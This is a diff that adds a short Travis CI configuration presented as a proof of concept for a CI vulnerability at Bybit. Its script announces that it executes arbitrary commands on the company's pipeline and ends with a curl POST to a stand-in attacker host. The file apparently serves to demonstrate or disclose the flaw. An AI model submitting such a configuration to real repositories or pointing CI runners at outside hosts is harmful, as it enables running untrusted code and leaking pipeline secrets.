@@ -1,0 +1,5 @@
+language: bash
+script:
+  - echo "This is a proof of concept for Bybit's Travis CI vulnerability."
+  - echo "Executing arbitrary commands on Bybit's CI pipeline."
+  - curl -X POST "https://attacker.com/payload"
